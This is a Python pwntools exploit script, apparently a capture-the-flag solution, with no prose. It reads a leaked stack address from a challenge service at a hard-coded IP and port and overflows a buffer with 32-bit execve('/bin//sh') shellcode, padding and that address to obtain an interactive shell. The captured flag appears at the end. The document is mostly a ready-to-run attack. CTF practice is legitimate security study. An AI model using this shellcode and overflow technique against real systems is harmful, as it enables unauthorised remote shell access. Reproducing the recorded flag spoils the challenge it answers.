from pwn import *

DEBUG = False

if DEBUG:
    r = process("./pwn2")
    gdb.attach(r)
    str_addr = r.recv()[-12:-2]
else:
    r = remote("35.246.42.94", 1337)
    r.recv()
    str_addr = r.recv()[-12:-2]

print(str_addr)

shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xDB\x31\xC9\x31\xD2\x89\xE3\x83\xC0\x0B\xCD\x80"
ret_offset = 302
payload = shellcode + "a"*(ret_offset-len(shellcode)) + p32(int(str_addr, base=16))

r.sendline(payload)

r.interactive()

# flag: GrabCON{Y0U_g0t_Sh3ll_B4asics}

